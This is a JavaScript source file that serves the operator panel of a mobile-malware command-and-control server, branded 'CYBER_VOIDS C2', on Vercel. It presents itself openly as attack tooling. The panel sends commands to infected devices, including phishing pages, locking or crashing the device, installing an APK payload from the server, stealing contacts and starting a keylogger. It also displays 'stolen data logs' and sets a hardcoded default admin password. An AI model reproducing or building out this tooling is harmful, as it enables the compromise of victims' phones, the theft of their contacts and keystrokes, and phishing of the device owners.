// api/admin.js
export default async function handler(req, res) {
  res.setHeader('Content-Type', 'text/html');
  
  const ADMIN_PASSWORD = process.env.ADMIN_PASS || 'franx123';
  
  // Simple admin panel
  const html = `
  <!DOCTYPE html>
  <html>
  <head>
    <title>😈 CYBER_VOIDS C2 - Vercel Edition</title>
    <style>
      * { margin: 0; padding: 0; box-sizing: border-box; }
      body { 
        background: #0a0a0a; 
        color: #00ff00; 
        font-family: 'Courier New', monospace;
        padding: 20px;
      }
      .container { max-width: 1200px; margin: 0 auto; }
      .header { 
        background: #000; 
        padding: 20px; 
        border-bottom: 2px solid #00ff00;
        margin-bottom: 20px;
      }
      .panel { 
        background: #111; 
        padding: 20px; 
        margin: 10px 0;
        border: 1px solid #00ff00;
      }
      input, textarea, select {
        width: 100%;
        background: #000;
        color: #00ff00;
        border: 1px solid #00ff00;
        padding: 10px;
        margin: 5px 0;
        font-family: 'Courier New', monospace;
      }
      button {
        background: #00ff00;
        color: #000;
        border: none;
        padding: 10px 20px;
        cursor: pointer;
        font-weight: bold;
        margin: 5px;
      }
      .danger { background: #ff0000; color: #fff; }
      table {
        width: 100%;
        border-collapse: collapse;
        margin: 10px 0;
      }
      th, td {
        border: 1px solid #00ff00;
        padding: 8px;
        text-align: left;
      }
      th { background: #000; }
      .log { 
        background: #000; 
        padding: 10px; 
        height: 300px; 
        overflow-y: auto;
        font-size: 12px;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="header">
        <h1>😈 CYBER_VOIDS C2 SERVER</h1>
        <p>Powered by Vercel | Server: ${req.headers.host}</p>
      </div>
      
      <div class="panel">
        <h2>⚡ SEND COMMAND TO DEVICE</h2>
        <input type="text" id="deviceId" placeholder="Device ID">
        <select id="commandSelect">
          <option value="">Select Command</option>
          <option value="OPEN_URL:https://google.com">Open Website</option>
          <option value="PHISH:https://fake-login.com">Phishing Page</option>
          <option value="LOCK_DEVICE">Lock Device</option>
          <option value="CRASH_SYSTEM">Crash System</option>
          <option value="DOWNLOAD_INSTALL:https://SERVER/payload.apk">Install APK</option>
          <option value="STEAL_CONTACTS">Steal Contacts</option>
          <option value="KEYLOG:start">Start Keylogger</option>
          <option value="custom">Custom Command</option>
        </select>
        <textarea id="customCommand" placeholder="Custom command..." style="display:none;"></textarea>
        <button onclick="sendCommand()">SEND COMMAND</button>
      </div>
      
      <div class="panel">
        <h2>📱 CONNECTED DEVICES</h2>
        <div id="devicesList">Loading devices...</div>
        <button onclick="refreshDevices()">🔄 Refresh</button>
      </div>
      
      <div class="panel">
        <h2>📊 STOLEN DATA LOGS</h2>
        <div class="log" id="dataLog">
          // Data will appear here
        </div>
        <button onclick="clearLogs()" class="danger">Clear Logs</button>
      </div>
    </div>
    
    <script>
      // Update command field
      document.getElementById('commandSelect').addEventListener('change', function() {
        document.getElementById('customCommand').style.display = 
          this.value === 'custom' ? 'block' : 'none';
      });
      
      // Send command function
      async function sendCommand() {
        const deviceId = document.getElementById('deviceId').value;
        let command = document.getElementById('commandSelect').value;
        
        if(command === 'custom') {
          command = document.getElementById('customCommand').value;
        }
        
        if(!deviceId || !command) {
          alert('Please fill device ID and command');
          return;
        }
        
        // Send to API
        const response = await fetch('/api/command?device=' + deviceId + '&command=' + encodeURIComponent(command));
        const result = await response.text();
        
        alert('Command sent: ' + result);
      }
      
      // Refresh devices
      async function refreshDevices() {
        document.getElementById('devicesList').innerHTML = 'Loading...';
        // You would fetch from your database here
        // For now, just show dummy data
        const devices = [
          {id: 'device_001', ip: '192.168.1.101', lastSeen: 'Just now'},
          {id: 'device_002', ip: '192.168.1.102', lastSeen: '2 mins ago'},
        ];
        
        let html = '<table><tr><th>Device ID</th><th>IP</th><th>Last Seen</th></tr>';
        devices.forEach(device => {
          html += \`<tr><td>\${device.id}</td><td>\${device.ip}</td><td>\${device.lastSeen}</td></tr>\`;
        });
        html += '</table>';
        
        document.getElementById('devicesList').innerHTML = html;
      }
      
      // Initial load
      refreshDevices();
    </script>
  </body>
  </html>
  `;
  
  res.status(200).send(html);
}
